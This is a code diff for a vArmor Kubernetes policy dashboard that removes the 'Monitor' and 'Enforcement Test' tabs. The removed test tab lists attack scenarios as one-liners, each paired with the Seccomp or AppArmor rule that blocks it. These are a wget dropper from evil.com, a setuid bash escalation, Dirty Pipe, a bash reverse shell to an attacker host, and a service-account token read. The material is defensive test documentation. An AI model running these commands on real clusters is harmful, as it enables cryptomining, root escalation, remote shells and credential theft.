@@ -171,14 +171,6 @@
           <svg class="w-3.5 h-3.5 inline-block mr-1 -mt-0.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"/></svg>
           Access Control
         </button>
-        <button id="tab-btn-monitor" class="tab-btn" onclick="switchTab('monitor')">
-          <svg class="w-3.5 h-3.5 inline-block mr-1 -mt-0.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
-          Monitor
-        </button>
-        <button id="tab-btn-enforcement" class="tab-btn" onclick="switchTab('enforcement')">
-          <svg class="w-3.5 h-3.5 inline-block mr-1 -mt-0.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-          Enforcement Test
-        </button>
         <div class="w-px h-5 mx-2" style="background:#334155"></div>
         <span id="lbl-user" class="text-sm hidden sm:block" style="color:#64748b"></span>
         <button onclick="logout()" class="btn btn-ghost btn-sm">Logout</button>
@@ -1688,130 +1680,6 @@
 
     </div>
 
-    <!-- ═══════════════ TAB: MONITOR ═══════════════ -->
-    <div id="tab-monitor" class="hidden max-w-screen-2xl mx-auto w-full px-6 py-6 space-y-6">
-      <div class="flex items-center justify-between">
-        <h2 class="text-lg font-bold flex items-center gap-2" style="color:#f1f5f9">
-          <svg class="w-5 h-5" style="color:#60a5fa" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
-          Policy Monitor
-          <span id="mon-badge-total" class="badge badge-blue ml-2" style="display:none"></span>
-        </h2>
-        <button onclick="loadPolicyMonitor()" class="btn btn-ghost btn-sm">
-          <svg class="w-3.5 h-3.5 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>Refresh
-        </button>
-      </div>
-      <!-- Stats row -->
-      <div class="grid grid-cols-3 gap-4" id="mon-stats">
-        <div class="card p-4">
-          <div class="text-xs mb-1" style="color:#94a3b8">Total Policies</div>
-          <div id="mon-stat-total" class="text-2xl font-bold" style="color:#f1f5f9">—</div>
-        </div>
-        <div class="card p-4">
-          <div class="text-xs mb-1" style="color:#94a3b8">Ready</div>
-          <div id="mon-stat-ready" class="text-2xl font-bold" style="color:#4ade80">—</div>
-        </div>
-        <div class="card p-4">
-          <div class="text-xs mb-1" style="color:#94a3b8">Not Ready</div>
-          <div id="mon-stat-notready" class="text-2xl font-bold" style="color:#f87171">—</div>
-        </div>
-      </div>
-      <!-- Table -->
-      <div class="card overflow-hidden">
-        <div id="mon-empty" class="hidden py-10 text-center text-sm" style="color:#475569">No VarmorPolicies found.</div>
-        <div id="mon-error" class="hidden p-4 text-sm rounded" style="background:#450a0a;color:#fca5a5"></div>
-        <div id="mon-loading" class="py-10 text-center text-sm" style="color:#475569">
-          <svg class="animate-spin w-5 h-5 inline-block mr-2" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>Loading…
-        </div>
-        <table id="mon-table" class="w-full text-sm hidden">
-          <thead>
-            <tr style="border-bottom:1px solid #1e293b">
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Name</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Namespace</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Scope</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Mode</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Enforcer</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Target</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Status</th>
-              <th class="text-left px-4 py-3 font-medium text-xs uppercase tracking-wide" style="color:#64748b">Created</th>
-            </tr>
-          </thead>
-          <tbody id="mon-tbody"></tbody>
-        </table>
-      </div>
-    </div><!-- /tab-monitor -->
-
-    <!-- ═══════════════ TAB: ENFORCEMENT TEST ═══════════════ -->
-    <div id="tab-enforcement" class="hidden max-w-screen-2xl mx-auto w-full px-6 py-6 space-y-6">
-      <div class="flex items-center justify-between">
-        <div>
-          <h2 class="text-lg font-bold flex items-center gap-2" style="color:#f1f5f9">
-            <svg class="w-5 h-5" style="color:#f59e0b" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-            Enforcement Test
-          </h2>
-          <p class="text-xs mt-1" style="color:#64748b">Deploys real attack pods, verifies vArmor Seccomp blocks syscalls live in the cluster</p>
-        </div>
-        <button id="et-run-btn" onclick="startEnforcementTest()" class="btn btn-primary">
-          <svg class="w-4 h-4 mr-1.5 inline-block" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-          Run Tests
-        </button>
-      </div>
-
-      <!-- Status bar -->
-      <div id="et-status-bar" class="hidden card p-3 flex items-center gap-3 text-sm">
-        <svg id="et-spin" class="animate-spin w-4 h-4 shrink-0 hidden" style="color:#60a5fa" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
-        <span id="et-status-msg" style="color:#94a3b8"></span>
-      </div>
-
-      <!-- Results cards -->
-      <div id="et-results" class="space-y-3 hidden"></div>
-
-      <!-- Scenario reference (always visible) -->
-      <div class="card p-5 space-y-4">
-        <h3 class="text-sm font-semibold" style="color:#94a3b8">Tested Attack Scenarios</h3>
-        <div class="space-y-3 text-sm">
-          <div class="flex gap-3 p-3 rounded-lg" style="background:#0f172a">
-            <span class="text-lg">🦠</span>
-            <div>
-              <div class="font-medium" style="color:#f1f5f9">chmod+x Dropper</div>
-              <div style="color:#64748b">wget evil.com/miner && <code style="color:#fbbf24">chmod +x miner</code> && ./miner — #1 K8s crypto-miner vector (r/kubernetes 2024)</div>
-              <div class="mt-1 text-xs" style="color:#475569">vArmor Seccomp rule: <code>disable-chmod-x-bit</code> → SCMP_ACT_ERRNO on chmod with S_IXUSR/S_IXGRP/S_IXOTH</div>
-            </div>
-          </div>
-          <div class="flex gap-3 p-3 rounded-lg" style="background:#0f172a">
-            <span class="text-lg">👑</span>
-            <div>
-              <div class="font-medium" style="color:#f1f5f9">SUID Privilege Escalation</div>
-              <div style="color:#64748b">chmod 4755 /bin/bash → run setuid shell inside container (r/netsec post-exploitation)</div>
-              <div class="mt-1 text-xs" style="color:#475569">vArmor Seccomp rule: <code>disable-chmod-s-bit</code> → SCMP_ACT_ERRNO on chmod with S_ISUID/S_ISGID</div>
-            </div>
-          </div>
-          <div class="flex gap-3 p-3 rounded-lg" style="background:#0f172a">
-            <span class="text-lg">💥</span>
-            <div>
-              <div class="font-medium" style="color:#f1f5f9">CVE-2022-0847 Dirty Pipe</div>
-              <div style="color:#64748b">splice() syscall overwrite read-only mapped files → root LPE (mass exploited Mar 2022)</div>
-              <div class="mt-1 text-xs" style="color:#475569">vArmor Seccomp rule: <code>dirty-pipe-mitigation</code> → SCMP_ACT_ERRNO on splice(2)</div>
-            </div>
-          </div>
-          <div class="flex gap-3 p-3 rounded-lg" style="background:#0f172a;opacity:.7">
-            <span class="text-lg">🐚</span>
-            <div>
-              <div class="font-medium" style="color:#94a3b8">Reverse Shell [AppArmor — skip in kind]</div>
-              <div style="color:#475569">bash -i &gt;&amp; /dev/tcp/attacker/4444 — vArmor AppArmor: deny /**/bash rx</div>
-              <div class="mt-1 text-xs" style="color:#334155">Requires bare-metal k8s: kubelet inside kind cannot enforce AppArmor profiles</div>
-            </div>
-          </div>
-          <div class="flex gap-3 p-3 rounded-lg" style="background:#0f172a;opacity:.7">
-            <span class="text-lg">🔑</span>
-            <div>
-              <div class="font-medium" style="color:#94a3b8">SA Token Exfiltration [AppArmor — skip in kind]</div>
-              <div style="color:#475569">cat /run/secrets/.../token → lateral movement in k8s — vArmor AppArmor: deny /run/secrets/** r</div>
-              <div class="mt-1 text-xs" style="color:#334155">Requires bare-metal k8s</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div><!-- /tab-enforcement -->
 
   </main>
 </div>
@@ -2261,15 +2129,13 @@ var editMode=null; // {name, ns, scope} when editing
 var statusPollTimer=null;
 var CURRENT_TAB="policy";
 function switchTab(tab){
-  ["dashboard","policy","logs","users","monitor","enforcement"].forEach(function(t){
+  ["dashboard","policy","logs","users"].forEach(function(t){
     var p=$("tab-"+t);
     if(p) p.classList.toggle("hidden",t!==tab);
     var b=$("tab-btn-"+t);
     if(b) b.classList.toggle("tab-active",t===tab);
   });
   CURRENT_TAB=tab;
-  if(tab==="monitor"){loadPolicyMonitor();}
-  if(tab==="enforcement"){loadEnforcementStatus();}
   if(tab==="dashboard"){loadDashboard();}
   if(tab==="logs"){
     // hide sub-nav buttons the current user has no permission to access
@@ -6588,118 +6454,6 @@ parseSpecIntoForm=function(crd,scope,name){
   });
 };
 
-// ══ Policy Monitor ══════════════════════════════════════════════════════════
-function loadPolicyMonitor(){
-  $("mon-loading").classList.remove("hidden");
-  $("mon-table").classList.add("hidden");
-  $("mon-empty").classList.add("hidden");
-  $("mon-error").classList.add("hidden");
-  api("/api/policy-monitor").then(function(r){return r.json();}).then(function(d){
-    $("mon-loading").classList.add("hidden");
-    $("mon-stat-total").textContent=d.total||0;
-    $("mon-stat-ready").textContent=d.ready||0;
-    $("mon-stat-notready").textContent=(d.total||0)-(d.ready||0);
-    var badge=$("mon-badge-total");
-    badge.textContent=d.total||0;
-    badge.style.display=(d.total>0)?"":"none";
-    var rows=(d.policies||[]);
-    if(!rows.length){$("mon-empty").classList.remove("hidden");return;}
-    $("mon-tbody").innerHTML=rows.map(function(p){
-      var st=p.status||"Pending";
-      var stCol=st==="Ready"?"#4ade80":st==="Pending"?"#fbbf24":"#f87171";
-      var enf=(p.enforcer||"AppArmor").split("|").map(function(e){
-        var c={"AppArmor":"#818cf8","BPF":"#34d399","Seccomp":"#fb923c","NetworkProxy":"#60a5fa"}[e.trim()]||"#94a3b8";
-        return '<span class="badge" style="background:'+c+'22;color:'+c+'">'+e.trim()+'</span>';
-      }).join(" ");
-      var tgt=(p.target||{});
-      var tgtStr=tgt.name||(tgt.selector?JSON.stringify(tgt.selector):"—");
-      var createdDate=p.created_at?p.created_at.replace("T"," ").replace("Z","").slice(0,16):"—";
-      return '<tr style="border-bottom:1px solid #1e293b">'+
-        '<td class="px-4 py-3 font-mono text-xs" style="color:#f1f5f9">'+_esc(p.name)+'</td>'+
-        '<td class="px-4 py-3 text-xs" style="color:#94a3b8">'+_esc(p.namespace||"—")+'</td>'+
-        '<td class="px-4 py-3 text-xs"><span class="badge '+(p.scope==="cluster"?"badge-amber":"badge-blue")+'">'+_esc(p.scope||"ns")+'</span></td>'+
-        '<td class="px-4 py-3 text-xs" style="color:#94a3b8">'+_esc(p.mode||"—")+'</td>'+
-        '<td class="px-4 py-3">'+enf+'</td>'+
-        '<td class="px-4 py-3 text-xs font-mono" style="color:#64748b">'+_esc(tgtStr)+'</td>'+
-        '<td class="px-4 py-3 text-xs"><span style="color:'+stCol+'">'+_esc(st)+'</span>'+
-          (p.status_message?'<div class="text-xs mt-0.5" style="color:#475569;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+_esc(p.status_message)+'">'+_esc(p.status_message)+'</div>':'')+
-        '</td>'+
-        '<td class="px-4 py-3 text-xs" style="color:#475569">'+createdDate+'</td>'+
-      '</tr>';
-    }).join("");
-    $("mon-table").classList.remove("hidden");
-  }).catch(function(e){
-    $("mon-loading").classList.add("hidden");
-    $("mon-error").textContent="Error: "+(e.message||e);
-    $("mon-error").classList.remove("hidden");
-  });
-}
-
-// ══ Enforcement Test ════════════════════════════════════════════════════════
-var _etPollTimer=null;
-function loadEnforcementStatus(){
-  api("/api/enforcement-test/status").then(function(r){return r.json();}).then(function(d){_renderEtState(d);}).catch(function(){});
-}
-function startEnforcementTest(){
-  if(!confirm("This will create temporary pods in namespace 'varmor-enf-test'.\nRequires seccomp profiles at /var/lib/kubelet/seccomp/varmor/ on the kind node.\nProceed?")) return;
-  $("et-run-btn").disabled=true;
-  api("/api/enforcement-test/run",{method:"POST"}).then(function(r){return r.json();}).then(function(){
-    clearInterval(_etPollTimer);
-    _etPollTimer=setInterval(function(){
-      api("/api/enforcement-test/status").then(function(r){return r.json();}).then(function(d){
-        _renderEtState(d);
-        if(d.status!=="running"){clearInterval(_etPollTimer);$("et-run-btn").disabled=false;}
-      }).catch(function(){clearInterval(_etPollTimer);$("et-run-btn").disabled=false;});
-    },3000);
-  }).catch(function(e){
-    $("et-run-btn").disabled=false;
-    alert("Failed to start: "+(e.message||e));
-  });
-}
-function _renderEtState(d){
-  var bar=$("et-status-bar"),msg=$("et-status-msg"),spin=$("et-spin");
-  bar.classList.remove("hidden");
-  msg.textContent=d.message||d.status||"";
-  spin.classList.toggle("hidden",d.status!=="running");
-  var statusColor={"done":"#4ade80","error":"#f87171","running":"#60a5fa","idle":"#64748b"}[d.status]||"#64748b";
-  bar.style.borderLeft="3px solid "+statusColor;
-  var res=$("et-results");
-  if(!d.results||!d.results.length){res.classList.add("hidden");return;}
-  res.classList.remove("hidden");
-  res.innerHTML=d.results.map(function(r){
-    var ok=r.ok,skip=r.skip;
-    var icon=skip?"⏭️":ok?"✅":"❌";
-    var bg=skip?"#1e293b":ok?"#052e16":"#450a0a";
-    var border=skip?"#334155":ok?"#15803d":"#7f1d1d";
-    var lbl=skip?"SKIP":ok?"PASS":"FAIL";
-    var lblCol=skip?"#94a3b8":ok?"#4ade80":"#f87171";
-    return '<div class="card p-4" style="background:'+bg+';border-color:'+border+'">'+
-      '<div class="flex items-start justify-between gap-4">'+
-        '<div class="flex items-center gap-2">'+
-          '<span class="text-base">'+icon+'</span>'+
-          '<div>'+
-            '<span class="font-medium text-sm" style="color:#f1f5f9">'+_esc(r.name)+'</span>'+
-            '<span class="ml-2 badge text-xs" style="color:'+lblCol+';background:'+lblCol+'22">'+lbl+'</span>'+
-          '</div>'+
-        '</div>'+
-        '<span class="badge badge-blue text-xs shrink-0">'+_esc(r.enforcer||"Seccomp")+'</span>'+
-      '</div>'+
-      '<div class="mt-2 text-xs" style="color:#64748b">'+_esc(r.scenario||"")+'</div>'+
-      '<div class="mt-3 grid grid-cols-2 gap-3">'+
-        '<div class="rounded p-2 text-xs font-mono" style="background:#0f172a">'+
-          '<div class="text-xs mb-1" style="color:#475569">Unprotected</div>'+
-          '<div style="color:#fbbf24">'+_esc(r.baseline||"—")+'</div>'+
-        '</div>'+
-        '<div class="rounded p-2 text-xs font-mono" style="background:#0f172a">'+
-          '<div class="text-xs mb-1" style="color:#475569">Protected (vArmor)</div>'+
-          '<div style="color:'+(ok?"#4ade80":"#f87171")+'">'+_esc(r.protected||"—")+'</div>'+
-        '</div>'+
-      '</div>'+
-    '</div>';
-  }).join("")+
-  (d.status==="done"?'<div class="text-center text-sm py-2" style="color:#64748b">Completed '+_esc(d.finished_at||"")+'</div>':"");
-}
-function _esc(s){return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");}
 </script>
 </body>
 </html>
